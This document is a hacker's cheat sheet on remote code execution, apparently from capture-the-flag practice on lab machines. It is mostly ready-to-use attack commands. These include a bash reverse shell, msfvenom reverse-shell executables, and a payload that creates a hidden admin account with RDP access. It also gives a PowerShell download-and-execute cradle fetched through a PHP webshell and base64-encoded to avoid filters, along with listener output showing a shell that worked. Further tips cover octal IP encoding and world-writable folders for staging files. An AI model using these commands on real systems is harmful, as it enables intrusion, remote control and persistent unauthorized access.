# Remote Code Execution notes

### Troubleshooting exploits

Proxy scripts is to use proxychains. Append
```plaintext
http 127.0.0.1 8080
```
to **/etc/proxychains.conf** then it will be directed Burp

To avoid bad chars note you can octal-encode IP addresses so periods can be skipped.  For eg. 192.168.3.3 is 030052001403, [can do it here](https://www.browserling.com/tools/ip-to-oct)

It can ping too

```shell
C:\Users\Ivan>ping 030052001403

Pinging 192.168.3.3 with 32 bytes of data:
Reply from 192.168.3.3: bytes=32 time<1ms TTL=128
Reply from 192.168.3.3: bytes=32 time<1ms TTL=128
Reply from 192.168.3.3: bytes=32 time<1ms TTL=128
Reply from 192.168.3.3: bytes=32 time<1ms TTL=128

Ping statistics for 192.168.3.3:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

## Linux

Bash reverse shell needs to specify bash in front because if the running shell is not bash it won't have **/dev/tcp**

```shell
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'
```

Get **nc64.exe** [from here](https://eternallybored.org/misc/netcat/) if needed.

#### World-writable folders (staging areas for dropping files)

1. **C:\Users\Public\Documents** for older Windows
2. **C:\Windows\Temp** for newer Windows
3. **C:\windows\system32\spool\drivers\color**

### msfvenom Windows

Reverse shell (if x86 doesn't work, try x64)

```text
root@kali:~/CTF/Box# msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.170 LPORT=443 EXITFUNC=thread -f exe -o ms17-010_64.exe
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: ms17-010_64.exe
```

Create new admin user, add to Admin group and RDP

```text
msfvenom -a x64 --platform Windows -p windows/x64/exec CMD='cmd /c net user /add admin Password1 & net localgroup Administrators admin /add & net localgroup "Remote Desktop Users" admin /add' -b '\x00' EXITFUNC=thread -f exe -o adduser64.exe
```



### Powershell Reverse shell

Use nishang's reverse shell, remove comments and rename function. This can work with simple PHP webshell.

```plaintext
http://secnotes.htb:8808/shell.php?cmd=powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.78/rshell.ps1')"
```
Or in case **powershell.exe** is not in $PATH preface it with `cmd.exe /c powershell.exe...`

Set up Python webserver to host **rshell.ps1**

```shell
root@Kali:~/HTB/SecNotes# python3 -m http.server --directory <path> 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.97 - - [19/Oct/2020 20:58:04] "GET /rshell.ps1 HTTP/1.1" 200 -
```
And get a PS reverse shell
```shell
root@Kali:~/HTB/SecNotes# rlwrap -r nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.78] from (UNKNOWN) [10.10.10.97] 49676
Windows PowerShell running as user SECNOTES$ on SECNOTES
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\new-site>
```

Alternatively if don't want to use Net.WebClient, try this

```shell
powershell.exe IEX( IWR http://10.10.14.78/rshell.ps1 -UseBasicParsing)
```

Or to avoid potential bad chars convert to b64.

```shell
root@kali:~/CTF/HTB/Remote# echo 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.78/rshell.ps1")' | iconv -t UTF-16LE | base64 -w0
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcAOAAvAHIAcwBoAGUAbABsAC4AcABzADEAIgApAAoA
```

Then get RCE with `powershell.exe -E <base64>` or alternatively `powershell.exe /enc <base64>`